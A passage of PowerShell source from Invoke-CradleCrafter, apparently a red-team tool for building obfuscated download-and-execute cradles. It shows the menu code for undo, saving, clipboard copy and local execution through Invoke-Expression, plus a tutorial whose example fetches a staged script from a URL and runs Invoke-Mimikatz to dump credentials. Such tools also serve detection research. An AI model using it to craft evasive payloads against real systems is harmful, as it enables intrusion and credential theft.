                        $Cradle = ''
                        $Script:LastContextShift = ''
                    }
                    
                    Write-Host "`n`nSuccessfully reset ObfuscatedCradle." -ForegroundColor Cyan
                }
            }
            ElseIf($UndoObfuscationInputOptions[0] -Contains $UserInput)
            {
                If(!$Cradle -OR (($Script:ObfuscatedCradle -ne $NULL) -AND ($Script:ObfuscatedCradle.Length -eq 0)))
                {
                    Write-Host "`n`nWARNING:" -NoNewLine -ForegroundColor Red
                    Write-Host " ObfuscatedCradle has not been set. There is nothing to undo."
                }                
                ElseIf(($Script:TokenArrayHistory.Count -eq 1) -OR ($Script:TokenArrayHistory.Count -eq 0) -OR ($Script:ObfuscatedCradle -eq $Script:PostCradleCommand))
                {
                    Write-Host "`n`nWARNING:" -NoNewLine -ForegroundColor Red
                    Write-Host " No obfuscation has been applied to ObfuscatedCradle. There is nothing to undo."
                }
                Else
                {
                    # Set ObfuscatedCradle to the last state in ObfuscatedCradleHistory.
                    $Script:ObfuscatedCradle  = $Script:ObfuscatedCradleHistory[$Script:ObfuscatedCradleHistory.Count-2]

                    # Set TokenArray to the last state in TokenArrayHistory.
                    $Script:TokenArray = $Script:TokenArrayHistory[$Script:TokenArrayHistory.Count-2]

                    # Remove the last state from ObfuscatedCradleHistory.
                    $Temp = $Script:ObfuscatedCradleHistory
                    $Script:ObfuscatedCradleHistory = @()
                    For($i=0; $i -lt $Temp.Count-1; $i++)
                    {
                        $Script:ObfuscatedCradleHistory += , $Temp[$i]
                    }

                    # Remove the last state from TokenArrayHistory.
                    $Temp = $Script:TokenArrayHistory
                    $Script:TokenArrayHistory = @()
                    For($i=0; $i -lt $Temp.Count-1; $i++)
                    {
                        $Script:TokenArrayHistory += , $Temp[$i]
                    }

                    # Remove last command from CliSyntax. Trim all trailing OUT or CLIP commands until an obfuscation command is removed.
                    $CliSyntaxCount = $Script:CliSyntax.Count
                    While(($Script:CliSyntax[$CliSyntaxCount-1] -Match '^(clip|out )') -AND ($CliSyntaxCount -gt 0))
                    {
                        $CliSyntaxCount--
                    }
                    $Temp = $Script:CliSyntax
                    $Script:CliSyntax = @()
                    For($i=0; $i -lt $CliSyntaxCount-1; $i++)
                    {
                        $Script:CliSyntax += $Temp[$i]
                    }

                    # Remove last command from ExecutionCommands.
                    $Temp = $Script:ExecutionCommands
                    $Script:ExecutionCommands = @()
                    For($i=0; $i -lt $Temp.Count-1; $i++)
                    {
                        $Script:ExecutionCommands += $Temp[$i]
                    }

                    # After reverting to last set of cradle state we will run Invoke-OutCradle again so that any updated Url, Path or PostCradleCommand values are re-applied to previous cradle syntaxes.
                    $Null = Invoke-OutCradle -Undo

                    Write-Host "`n`nSuccessfully removed last obfuscation from ObfuscatedCradle." -ForegroundColor Cyan
                }
            }
            ElseIf(($OutputToDiskInputOptions[0] -Contains $UserInput) -OR ($OutputToDiskInputOptions[0] -Contains $UserInput.Trim().Split(' ')[0]))
            {
                If($Script:ObfuscatedCradle -ne '')
                {
                    # Get file path information from compound user input (e.g. OUT C:\FILENAME.TXT).
                    If($UserInput.Trim().Split(' ').Count -gt 1)
                    {
                        # Get file path information from user input.
                        $UserInputOutputFilePath = $UserInput.Trim().SubString(4).Trim()
                        Write-Host ''
                    }
                    Else
                    {
                        # Get file path information from user interactively.
                        $UserInputOutputFilePath = Read-Host "`n`nEnter path for output file (or leave blank for default)"
                    }

                    # Decipher if user input a full file path, just a file name or nothing (default).
                    If($UserInputOutputFilePath.Trim() -eq '')
                    {
                        # User did not input anything so use default filename and current directory of this script.
                        $OutputFilePath = "$ScriptDir\Obfuscated_Cradle.txt"
                    }
                    ElseIf(!($UserInputOutputFilePath.Contains('\')) -AND !($UserInputOutputFilePath.Contains('/')))
                    {
                        # User input is not a file path so treat it as a filename and use current directory of this script.
                        $OutputFilePath = "$ScriptDir\$($UserInputOutputFilePath.Trim())"
                    }
                    Else
                    {
                        # User input is a full file path.
                        $OutputFilePath = $UserInputOutputFilePath
                    }
                    
                    # Write ObfuscatedCradle out to disk.
                    Write-Output $Script:ObfuscatedCradle > $OutputFilePath

                    If(Test-Path $OutputFilePath)
                    {
                        $Script:CliSyntax += "out $OutputFilePath"
                        Write-Host "`nSuccessfully output ObfuscatedCradle to" -NoNewLine -ForegroundColor Cyan
                        Write-Host " $OutputFilePath" -NoNewLine -ForegroundColor Yellow

                        Write-Host ".`nTo apply further obfuscation and/or Launchers then see" -NoNewLine -ForegroundColor Cyan
                        Write-Host " Invoke-Obfuscation" -NoNewLine -ForegroundColor Yellow
                        Write-Host " framework:" -ForegroundColor Cyan
                        Write-Host "   https://github.com/danielbohannon/Invoke-Obfuscation" -ForegroundColor Yellow
                        Write-Host "   Import-Module .\Invoke-Obfuscation.psd1" -ForegroundColor Green
                        Write-Host "   Invoke-Obfuscation -ScriptBlock {" -NoNewline -ForegroundColor Green
                        Write-Host "<Invoke-CradleCrafter Result>" -NoNewline -ForegroundColor Magenta
                        Write-Host "}" -ForegroundColor Green

                        If($Env:windir) { C:\Windows\Notepad.exe $OutputFilePath }
                    }
                    Else
                    {
                        Write-Host "`nERROR: Unable to write ObfuscatedCradle out to" -NoNewLine -ForegroundColor Red
                        Write-Host " $OutputFilePath" -NoNewLine -ForegroundColor Yellow
                    }
                }
                ElseIf($Script:ObfuscatedCradle -eq '')
                {
                    Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
                    Write-Host " There isn't anything to write out to disk.`n       Just enter" -NoNewLine
                    Write-Host " SHOW OPTIONS" -NoNewLine -ForegroundColor Yellow
                    Write-Host " and look at ObfuscatedCradle."

                    If($BreadCrumb.Split('\').Count -gt 2)
                    {
                        # The only way we can be this many levels deep and not have a value for ObfuscatedCradle is if RESET was run within this menu.
                        # Output appropriate instructions to user to re-initialize ObfuscatedCradle value.
                        Write-Host "       You must either:"
                        Write-Host "       1) Apply obfuscation in the current cradle menu."
                        Write-Host "       2) Navigate out of the current menu and back to a cradle menu of your choosing.`n          E.g. execute:" -NoNewline
                    }
                    Else
                    {
                        Write-Host "       Navigate to a cradle menu of your choosing.`n       E.g. execute:" -NoNewline
                    }
                    Write-Host " Memory\*" -NoNewLine -ForegroundColor Yellow
                    Write-Host " or" -NoNewLine
                    Write-Host " Disk\*" -ForegroundColor Yellow
                }
            }
            ElseIf($CopyToClipboardInputOptions[0] -Contains $UserInput)
            {
                If(($Script:ObfuscatedCradle -ne '') -AND ($Script:ObfuscatedCradle -eq $Script:PostCradleCommand))
                {
                    Write-Host "`n`nWARNING:" -NoNewLine -ForegroundColor Red
                    Write-Host " You haven't applied any obfuscation.`n         Just enter" -NoNewLine
                    Write-Host " SHOW OPTIONS" -NoNewLine -ForegroundColor Yellow
                    Write-Host " and look at ObfuscatedCradle."
                }
                # Alert on ObfuscatedCradle results that are greater than cmd.exe's maximum command line limit.
                # This is carried over from Invoke-Obfuscation and should never be an issue with Invoke-CradleCrafter.
                ElseIf($Script:ObfuscatedCradle.Length -gt $CmdMaxLength)
                {
                    Write-Host "`n`nWARNING:" -NoNewLine -ForegroundColor Red
                    Write-Host " ObfuscatedCradle length (" -NoNewLine
                    Write-Host "$($Script:ObfuscatedCradle.Length)" -NoNewLine -ForegroundColor Yellow
                    Write-Host ") exceeds cmd.exe limit ($CmdMaxLength).`n         Enter" -NoNewLine
                    Write-Host " OUT" -NoNewLine -ForegroundColor Yellow
                    Write-Host " to write ObfuscatedCradle out to disk." -NoNewLine
                }
                ElseIf($Script:ObfuscatedCradle -ne '')
                {
                    # Copy ObfuscatedCommand to clipboard.
                    # Try-Catch block introduced since PowerShell v2.0 without -STA defined will not be able to perform clipboard functionality.
                    Try
                    {
                        $Null = [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
                        [Windows.Forms.Clipboard]::SetText($Script:ObfuscatedCradle) 
                    
                        Write-Host "`n`nSuccessfully copied ObfuscatedCradle to clipboard.`nCommand can be pasted into powershell.exe.`nTo apply further obfuscation and/or Launchers then see" -NoNewLine -ForegroundColor Cyan
                        Write-Host " Invoke-Obfuscation" -NoNewLine -ForegroundColor Yellow
                        Write-Host " framework:" -ForegroundColor Cyan
                        Write-Host "   https://github.com/danielbohannon/Invoke-Obfuscation" -ForegroundColor Yellow
                        Write-Host "   Import-Module .\Invoke-Obfuscation.psd1" -ForegroundColor Green
                        Write-Host "   Invoke-Obfuscation -ScriptBlock {" -NoNewline -ForegroundColor Green
                        Write-Host "<Invoke-CradleCrafter Result>" -NoNewline -ForegroundColor Magenta
                        Write-Host "}" -ForegroundColor Green
                    }
                    Catch
                    {
                        $ErrorMessage = "Clipboard functionality will not work in PowerShell version $($PsVersionTable.PsVersion.Major) unless you add -STA (Single-Threaded Apartment) execution flag to powershell.exe."

                        If((Get-Command Write-Host).CommandType -ne 'Cmdlet')
                        {
                            # Retrieving Write-Host and Start-Sleep Cmdlets to get around the current proxy functions of Write-Host and Start-Sleep that are overloaded if -Quiet flag was used.
                            . ((Get-Command Write-Host)  | Where-Object {$_.CommandType -eq 'Cmdlet'}) "`n`nWARNING: " -NoNewLine -ForegroundColor Red
                            . ((Get-Command Write-Host)  | Where-Object {$_.CommandType -eq 'Cmdlet'}) $ErrorMessage -NoNewLine

                            . ((Get-Command Start-Sleep) | Where-Object {$_.CommandType -eq 'Cmdlet'}) 2
                        }
                        Else
                        {
                            Write-Host "`n`nWARNING: " -NoNewLine -ForegroundColor Red
                            Write-Host $ErrorMessage

                            If($Script:CliSyntax -gt 0) {Start-Sleep 2}
                        }
                    }

                    $Script:CliSyntax += 'clip'
                }
                ElseIf($Script:ObfuscatedCradle -eq '')
                {
                    Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
                    Write-Host " There isn't anything to copy to your clipboard.`n       Just enter" -NoNewLine
                    Write-Host " SHOW OPTIONS" -NoNewLine -ForegroundColor Yellow
                    Write-Host " and look at ObfuscatedCradle."

                    If($BreadCrumb.Split('\').Count -gt 2)
                    {
                        # The only way we can be this many levels deep and not have a value for ObfuscatedCradle is if RESET was run within this menu.
                        # Output appropriate instructions to user to re-initialize ObfuscatedCradle value.
                        Write-Host "       You must either:"
                        Write-Host "       1) Apply obfuscation in the current cradle menu."
                        Write-Host "       2) Navigate out of the current menu and back to a cradle menu of your choosing.`n          E.g. execute:" -NoNewline
                    }
                    Else
                    {
                        Write-Host "       Navigate to a cradle menu of your choosing.`n       E.g. execute:" -NoNewline
                    }
                    Write-Host " Memory\*" -NoNewLine -ForegroundColor Yellow
                    Write-Host " or" -NoNewLine
                    Write-Host " Disk\*" -ForegroundColor Yellow
                }
                
            }
            ElseIf($ExecutionInputOptions[0] -Contains $UserInput)
            {
                If($Script:ObfuscatedCradle -ne '')
                {
                    # We will invoke with Start-Job for certain fringe cases that don't allow you to invoke more than once in a given PowerShell session.
                    # These cases include: Import-Module/IPMO usage for invocation, PsInlineCSharp when contents passed to Add-Type are changed without the Class name changing, etc.
                    $UseStartJob = $FALSE
                    If($Script:ObfuscatedCradle.Contains('public class ') -OR $Script:ObfuscatedCradle.Contains('Import-Module ') -OR $Script:ObfuscatedCradle.Contains('IPMO ') -OR ($Script:ObfuscatedCradle.Contains('Reflection.Assembly]::') -AND $Script:ObfuscatedCradle.Contains('[Byte[]]')))
                    {
                        $UseStartJob = $TRUE
                    }

                    $TokenList = $Script:TokenArray | ForEach-Object {$_[0]}
                    If($TokenList -NotContains 'Invoke') {Write-Host "`n`nInvoking (though you haven't applied any INVOKE syntax yet):"}
                    ElseIf($UseStartJob) {Write-Host "`n`nInvoking (using Start-Job):"}
                    Else {Write-Host "`n`nInvoking:"}
                    
                    Out-ScriptContents $Script:ObfuscatedCradle
                    Write-Host ''

                    # We will invoke with Start-Job for certain fringe cases that don't allow you to invoke more than once in a given PowerShell session.
                    # These cases include: Import-Module/IPMO usage for invocation, PsInlineCSharp when contents passed to Add-Type are changed without the Class name changing, etc.
                    If($UseStartJob)
                    {
                        $Job = Start-Job -ScriptBlock {
                            $Result = Invoke-Expression $Using:ObfuscatedCradle

                            # Write-Output the result so it can be received outside of this job via the Receive-Job cmdlet.
                            Write-Output $Result
                        }
                        $Null = Wait-Job $Job
                        $Result = Receive-Job $Job
                    }
                    Else
                    {
                        $Result = Invoke-Expression $Script:ObfuscatedCradle
                    }

                    If($Result)
                    {
                        # Output if no Invoke syntax was applied and the results cradle execution produces stdout.
                        Write-Host $Result -ForegroundColor White
                    }
                }
                ElseIf($Script:Url -eq '')
                {
                    # With updated Context Shift logic we should not hit this ElseIf block anymore. Leaving here just in case this changes.
                    Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
                    Write-Host " Cannot execute because you have not entered a value for Url.`n       Enter" -NoNewline
                    Write-Host " SHOW OPTIONS" -NoNewLine -ForegroundColor Yellow
                    Write-Host " to set Url (and optionally Path and/or PostCradleCommand)."
                }
                Else {
                    # With updated Context Shift logic we should not hit this Else block anymore. Leaving here just in case this changes.
                    Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
                    If($BreadCrumb.Split('\').Count -gt 2)
                    {
                        # The only way we can be this many levels deep and not have a value for ObfuscatedCradle is if RESET was run within this menu.
                        # Output appropriate instructions to user to re-initialize ObfuscatdCradle value.
                        Write-Host " Cannot execute because ObfuscatedCradle value is null since you ran RESET.`n       Just enter" -NoNewLine
                        Write-Host " SHOW OPTIONS" -NoNewLine -ForegroundColor Yellow
                        Write-Host " and look at ObfuscatedCradle.`n       You must either:"
                        Write-Host "       1) Apply obfuscation in the current cradle menu."
                        Write-Host "       2) Navigate out of the current menu and back to a cradle menu of your choosing.`n          E.g. execute:" -NoNewline
                    }
                    Else
                    {
                        Write-Host " Cannot execute because ObfuscatedCradle value is null.`n       Just enter" -NoNewLine
                        Write-Host " SHOW OPTIONS" -NoNewLine -ForegroundColor Yellow
                        Write-Host " and look at ObfuscatedCradle.`n       Navigate to a cradle menu of your choosing.`n       E.g. execute:" -NoNewline
                    }
                    Write-Host " Memory\*" -NoNewLine -ForegroundColor Yellow
                    Write-Host " or" -NoNewLine
                    Write-Host " Disk\*" -ForegroundColor Yellow
                }
            }
            Else
            {
                Write-Host "`n`nERROR:" -NoNewLine -ForegroundColor Red
                Write-Host " You entered an invalid option. Enter" -NoNewLine
                Write-Host " HELP" -NoNewLine -ForegroundColor Yellow
                Write-Host " for more information."

                # If the failed input was part of $Script:CompoundCommand then cancel out the rest of the compound command so it is not further processed.
                If($Script:CompoundCommand.Count -gt 0)
                {
                    $Script:CompoundCommand = @()
                }

                # Output all available/acceptable options for current menu if invalid input was entered.
                If($AcceptableInput.Count -gt 1)
                {
                    $Message = 'Valid options for current menu include:'
                }
                Else
                {
                    $Message = 'Valid option for current menu includes:'
                }
                Write-Host "       $Message " -NoNewLine

                $Counter=0
                ForEach($AcceptableOption in $AcceptableInput)
                {
                    $Counter++

                    # Change color and verbiage if acceptable options will execute an obfuscation function.
                    If($SelectionContainsCommand)
                    {
                        $ColorToOutput = 'Green'
                    }
                    Else
                    {
                        $ColorToOutput = 'Yellow'
                    }

                    Write-Host $AcceptableOption -NoNewLine -ForegroundColor $ColorToOutput
                    If(($Counter -lt $AcceptableInput.Length) -AND ($AcceptableOption.Length -gt 0))
                    {
                        Write-Host ', ' -NoNewLine
                    }
                }
                Write-Host ''
            }
        }
    }
    
    Return $UserInput.ToLower()
}


Function Show-OptionsMenu
{
<#
.SYNOPSIS

HELPER FUNCTION :: Displays options menu for Invoke-CradleCrafter.

Invoke-CradleCrafter Function: Show-OptionsMenu
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Show-OptionsMenu displays options menu for Invoke-CradleCrafter.

.EXAMPLE

C:\PS> Show-OptionsMenu

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    # Set potentially-updated script-level values in $Script:OptionsMenu before displaying.
    $Counter = 0
    ForEach($Line in $Script:OptionsMenu)
    {
        If($Line[0].ToLower().Trim() -eq 'url')               {$Script:OptionsMenu[$Counter][1] = $Script:Url}
        If($Line[0].ToLower().Trim() -eq 'path')              {$Script:OptionsMenu[$Counter][1] = $Script:Path}
        If($Line[0].ToLower().Trim() -eq 'postcradlecommand') {$Script:OptionsMenu[$Counter][1] = $Script:PostCradleCommand}
        If($Line[0].ToLower().Trim() -eq 'commandlinesyntax') {$Script:OptionsMenu[$Counter][1] = $Script:CliSyntax}
        If($Line[0].ToLower().Trim() -eq 'executioncommands') {$Script:OptionsMenu[$Counter][1] = $Script:ExecutionCommands}
        If($Line[0].ToLower().Trim() -eq 'obfuscatedcradle')
        {
            # Only add ObfuscatedCradle if it is different than PostCradleCommand (to avoid showing ObfuscatedCradle before it has been obfuscated).
            If($Script:ObfuscatedCradle -ne $Script:PostCradleCommand)
            {
                $Script:OptionsMenu[$Counter][1] = $Script:ObfuscatedCradle
            }
            Else
            {
                $Script:OptionsMenu[$Counter][1] = ''
            }
        }
        If($Line[0].ToLower().Trim() -eq 'obfuscationlength')
        {
            # Only set/display ObfuscationLength if there is an obfuscated command.
            If(($Script:ObfuscatedCradle.Length -gt 0) -AND ($Script:ObfuscatedCradle -ne $Script:PostCradleCommand))
            {
                $Script:OptionsMenu[$Counter][1] = $Script:ObfuscatedCradle.Length
            }
            Else
            {
                $Script:OptionsMenu[$Counter][1] = ''
            }
        }

        $Counter++
    }
    
    # Output menu.
    Write-Host "`n`nSHOW OPTIONS" -NoNewLine -ForegroundColor Cyan
    Write-Host " ::" -NoNewLine
    Write-Host " Yellow" -NoNewLine -ForegroundColor Yellow
    Write-Host " options can be set by entering" -NoNewLine
    Write-Host " SET OPTIONNAME VALUE" -NoNewLine -ForegroundColor Green
    Write-Host ".`n"
    ForEach($Option in $Script:OptionsMenu)
    {
        $OptionTitle = $Option[0]
        $OptionValue = $Option[1]
        $CanSetValue = $Option[2]
      
        Write-Host $LineSpacing -NoNewLine
        
        # For options that can be set by user, output as Yellow.
        If($CanSetValue) {Write-Host $OptionTitle -NoNewLine -ForegroundColor Yellow}
        Else {Write-Host $OptionTitle -NoNewLine}
        Write-Host ": " -NoNewLine
        
        # Handle coloring and multi-value output for ExecutionCommands and ObfuscationLength.
        If($OptionTitle -eq 'ObfuscationLength')
        {
            Write-Host $OptionValue -ForegroundColor Cyan
        }
        ElseIf($OptionTitle -eq 'PostCradleCommand')
        {
            Out-ScriptContents $OptionValue
        }
        ElseIf($OptionTitle -eq 'CommandLineSyntax')
        {
            # CLISyntax output.
            $SetSyntax = ''
            If(($Script:Url.Length -gt 0) -AND ($Script:Url -ne 'N/A'))
            {
                $SetSyntax += " -Url '$Script:Url'"
            }
            If(($Script:Path.Length -gt 0) -AND ($Script:Path -ne 'N/A'))
            {
                $SetSyntax += " -Path '$Script:Path'"
            }
            If(($Script:PostCradleCommand.Length -gt 0) -AND ($Script:PostCradleCommand -ne 'N/A'))
            {
                $SetSyntax += " -PostCradleCommand {$Script:PostCradleCommand}"
            }

            # Handle -Command CLI syntax in SHOW OPTIONS since Context Shift actually calls Out-Cradle and should be represented in CLI syntax.
            If(($OptionValue.Count -eq 0) -AND ($Script:ObfuscatedCradle.Length -gt 0))
            {
                $CommandFromContextShift = $Script:LastContextShift.Replace('_','\')

                $SetSyntax += " -Command '$CommandFromContextShift'"
            }

            $CommandSyntax = ''
            If($OptionValue.Count -gt 0)
            {
                # We must present a unique list of CLI command syntaxes (honoring the latest value for duplicate command syntaxes).
                # To do this we will iterate $OptionValue in reverse and discard future instances of any duplicates.
                $OptionValueTemp = $OptionValue
                $CliSyntaxSubPathArray = @()
                $OptionValue = @()
                For($i=$OptionValueTemp.Count-1; $i -ge 0; $i--)
                {
                    $CliSyntax = $OptionValueTemp[$i]
                    $CliSyntaxSubpath = $CliSyntax.SubString(0,$CliSyntax.LastIndexOf('\')+1)
                    If(!($CliSyntaxSubPathArray -Contains $CliSyntaxSubpath))
                    {
                        $OptionValue += $CliSyntax
                        $CliSyntaxSubPathArray += $CliSyntaxSubpath

                        # If ALL option is used then it supersedes all previous obfuscations, so don't display anything before ALL.
                        If($CliSyntax.EndsWith('\All\1')) {$i=0}
                    }
                }

                # Now that we have a properly de-duped $OptionValue array we must restore the original order by reversing the array values.
                $OptionValueTemp = $OptionValue
                $OptionValue = @()
                For($i=$OptionValueTemp.Count-1; $i -ge 0; $i--)
                {
                    $CliSyntax = $OptionValueTemp[$i]
                    $OptionValue += $CliSyntax
                }

                $CommandSyntax = " -Command '" + ($OptionValue -Join ',') + "' -Quiet"
            }

            If(($SetSyntax -ne '') -OR ($CommandSyntax -ne ''))
            {
                $CliSyntaxToOutput = "Invoke-CradleCrafter" + $SetSyntax + $CommandSyntax
                Write-Host $CliSyntaxToOutput -ForegroundColor Cyan
            }
            Else
            {
                Write-Host ''
            }
        }
        ElseIf($OptionTitle -eq 'ExecutionCommands')
        {
            # We must present a unique list of ExecutionCommands values (honoring the latest value for duplicate ExecutionCommands values).
            # To do this we will iterate $OptionValue in reverse and discard future instances of any duplicates.
            $OptionValueTemp = $OptionValue
            $ExecutionCommandSubPathArray = @()
            $OptionValue = @()
            For($i=$OptionValueTemp.Count-1; $i -ge 0; $i--)
            {
                $ExecutionCommand = $OptionValueTemp[$i]
                $ExecutionCommandSubpath = $ExecutionCommand.Split("'")[1] #.SubString(0,$ExecutionCommand.LastIndexOf('\')+1)
                If(!($ExecutionCommandSubPathArray -Contains $ExecutionCommandSubpath))
                {
                    $OptionValue += $ExecutionCommand
                    $ExecutionCommandSubPathArray += $ExecutionCommandSubpath

                    # If ALL option is used then it supersedes all previous obfuscations, so don't display anything before ALL.
                    If($ExecutionCommand.EndsWith("@('All',1)")) {$i=0}
                }
            }

            # Now that we have a properly de-duped $OptionValue array we must restore the original order by reversing the array values.
            $OptionValueTemp = $OptionValue
            $OptionValue = @()
            For($i=$OptionValueTemp.Count-1; $i -ge 0; $i--)
            {
                $ExecutionCommand = $OptionValueTemp[$i]
                $OptionValue += $ExecutionCommand
            }

            # If $Cradle is defined and $Script:ObfuscatedCradle is defined but there are not any ExecutionCommands values then $Script:ObfuscatedCradle was set via a Context Shift event.
            # Therefore, we will display the underlying Out-Cradle command that was invoked to obtain this default value.
            # After more obfuscation has been applied (making $OptionValue.Count -gt 0) then this message won't be displayed since this action will be implicit in future obfuscation events.
            If($Cradle -AND ($Script:ObfuscatedCradle.Length -gt 0) -AND ($OptionValue.Count -eq 0))
            {
                $OptionValue = @('Out-Cradle -Url $Url -Cradle ' + $Cradle)
            }

            # ExecutionCommands output.
            If($OptionValue.Count -gt 0) {Write-Host ''}
            $Counter = 0
            ForEach($ExecutionCommand in $OptionValue)
            {
                $Counter++
                If($ExecutionCommand.Length -eq 0) {Write-Host ''; Continue}
            
                $ExecutionCommand = $ExecutionCommand.Replace('$Url','~').Split('~')
                Write-Host "    $($ExecutionCommand[0])" -NoNewLine -ForegroundColor Cyan
                Write-Host '$Url' -NoNewLine -ForegroundColor Magenta

                # Add Path syntax.
                If($Script:Path -AND ($Script:Path.Length -gt 0))
                {
                    Write-Host " -Path " -NoNewLine -ForegroundColor Cyan
                    Write-Host '$Path' -NoNewLine -ForegroundColor Magenta
                }

                # Add Command (Out-Cradle.ps1 syntax) if PostCradleCommand (Invoke-CradleCrafter.ps1 syntax) exists.
                If($Script:PostCradleCommand -AND ($Script:PostCradleCommand.Length -gt 0))
                {
                    Write-Host " -Command " -NoNewLine -ForegroundColor Cyan
                    Write-Host '$PostCradleCommand' -NoNewLine -ForegroundColor Magenta
                }
                
                # Handle output formatting when SHOW OPTIONS is run.
                If(($OptionValue.Count -gt 0) -AND ($Counter -lt $OptionValue.Count))
                {
                    Write-Host $ExecutionCommand[1] -ForegroundColor Cyan
                }
                Else
                {
                    Write-Host $ExecutionCommand[1] -NoNewLine -ForegroundColor Cyan
                }
            }
            Write-Host ''
        }
        ElseIf($OptionTitle -eq 'ObfuscatedCradle')
        {
            Out-ScriptContents $OptionValue
        }
        Else
        {
            Write-Host $OptionValue -ForegroundColor Magenta
        }
    }
}


Function Show-HelpMenu
{
<#
.SYNOPSIS

HELPER FUNCTION :: Displays help menu for Invoke-CradleCrafter.

Invoke-CradleCrafter Function: Show-HelpMenu
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Show-HelpMenu displays help menu for Invoke-CradleCrafter.

.EXAMPLE

C:\PS> Show-HelpMenu

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    # Show Help Menu.
    Write-Host "`n`nHELP MENU" -NoNewLine -ForegroundColor Cyan
    Write-Host " :: Available" -NoNewLine
    Write-Host " options" -NoNewLine -ForegroundColor Yellow
    Write-Host " shown below:`n"
    ForEach($InputOptionsList in $AllAvailableInputOptionsLists)
    {
        $InputOptionsCommands    = $InputOptionsList[0]
        $InputOptionsDescription = $InputOptionsList[1]

        # Add additional coloring to string encapsulated by <> if it exists in $InputOptionsDescription.
        If($InputOptionsDescription.Contains('<') -AND $InputOptionsDescription.Contains('>'))
        {
            $FirstPart  = $InputOptionsDescription.SubString(0,$InputOptionsDescription.IndexOf('<'))
            $MiddlePart = $InputOptionsDescription.SubString($FirstPart.Length+1)
            $MiddlePart = $MiddlePart.SubString(0,$MiddlePart.IndexOf('>'))
            $LastPart   = $InputOptionsDescription.SubString($FirstPart.Length+$MiddlePart.Length+2)
            Write-Host "$LineSpacing $FirstPart" -NoNewLine
            Write-Host $MiddlePart -NoNewLine -ForegroundColor Cyan
            Write-Host $LastPart -NoNewLine
        }
        Else
        {
            Write-Host "$LineSpacing $InputOptionsDescription" -NoNewLine
        }
        
        $Counter = 0
        ForEach($Command in $InputOptionsCommands)
        {
            $Counter++
            Write-Host $Command.ToUpper() -NoNewLine -ForegroundColor Yellow
            If($Counter -lt $InputOptionsCommands.Count) {Write-Host ',' -NoNewLine}
        }
        Write-Host ''
    }
}


Function Show-Tutorial
{
<#
.SYNOPSIS

HELPER FUNCTION :: Displays tutorial information for Invoke-CradleCrafter.

Invoke-CradleCrafter Function: Show-Tutorial
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Show-Tutorial displays tutorial information for Invoke-CradleCrafter.

.EXAMPLE

C:\PS> Show-Tutorial

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Write-Host "`n`nTUTORIAL" -NoNewLine -ForegroundColor Cyan
    Write-Host " :: Here is a quick tutorial showing you how to rock your cradle:"
    
    Write-Host "`n1) " -NoNewLine -ForegroundColor Cyan
    Write-Host "(Required) Set a URL/UNC path (SET URL) to the staged script you want to download and run."
    Write-Host "   (Optional) Set a Path (SET PATH) to download the staged script to for Disk-based cradles."
    Write-Host "   (Optional) Set a PostCradleCommand (SET POSTCRADLECOMMAND) to run after cradle execution."
    Write-Host "   SET URL http://bit.ly/L3g1tCrad1e" -ForegroundColor Green
    Write-Host "   SET PATH Default_File_Path.ps1" -ForegroundColor Green
    Write-Host "   SET POSTCRADLECOMMAND Invoke-Mimikatz -DumpCr > creds.txt; notepad creds.txt" -ForegroundColor Green

    Write-Host "`n2) " -NoNewLine -ForegroundColor Cyan
    Write-Host "Navigate through the obfuscation menus where the options are in" -NoNewLine
    Write-Host " YELLOW" -NoNewLine -ForegroundColor Yellow
    Write-Host "."
    Write-Host "   GREEN" -NoNewLine -ForegroundColor Green
    Write-Host " options apply obfuscation."
    Write-Host "   Enter" -NoNewLine
    Write-Host " BACK" -NoNewLine -ForegroundColor Yellow
    Write-Host "/" -NoNewLine
    Write-Host "CD .." -NoNewLine -ForegroundColor Yellow
    Write-Host " to go to previous menu and" -NoNewLine
    Write-Host " HOME" -NoNewline -ForegroundColor Yellow
    Write-Host "/" -NoNewline
    Write-Host "MAIN" -NoNewline -ForegroundColor Yellow
    Write-Host " to go to home menu.`n   E.g. Enter" -NoNewLine
    Write-Host " MEMORY\PSWEBSTRING\ALL" -NoNewLine -ForegroundColor Yellow
    Write-Host " & then" -NoNewLine
    Write-Host " 1" -NoNewLine -ForegroundColor Green
    Write-Host " to apply all obfuscation to the cradle."
    
    Write-Host "`n3) " -NoNewLine -ForegroundColor Cyan
    Write-Host "Enter" -NoNewLine
    Write-Host " TEST" -NoNewLine -ForegroundColor Yellow
    Write-Host "/" -NoNewLine
    Write-Host "EXEC" -NoNewLine -ForegroundColor Yellow
    Write-Host " to test the obfuscated command locally.`n   Enter" -NoNewLine
    Write-Host " SHOW" -NoNewLine -ForegroundColor Yellow
    Write-Host " to see the currently obfuscated command."
    
    Write-Host "`n4) " -NoNewLine -ForegroundColor Cyan
    Write-Host "Enter" -NoNewLine
    Write-Host " COPY" -NoNewLine -ForegroundColor Yellow
    Write-Host "/" -NoNewLine
    Write-Host "CLIP" -NoNewLine -ForegroundColor Yellow
    Write-Host " to copy obfuscated command out to your clipboard."
    Write-Host "   Enter" -NoNewLine
    Write-Host " OUT" -NoNewLine -ForegroundColor Yellow
    Write-Host " to write obfuscated command out to disk."
    
    Write-Host "`n5) " -NoNewLine -ForegroundColor Cyan
    Write-Host "Enter" -NoNewLine
    Write-Host " RESET" -NoNewLine -ForegroundColor Yellow
    Write-Host " to remove all obfuscation and start over.`n   Enter" -NoNewLine
    Write-Host " UNDO" -NoNewLine -ForegroundColor Yellow
    Write-Host " to undo last obfuscation.`n   Enter" -NoNewLine
    Write-Host " HELP" -NoNewLine -ForegroundColor Yellow
    Write-Host "/" -NoNewLine
    Write-Host "?" -NoNewLine -ForegroundColor Yellow
    Write-Host " for help menu."
    
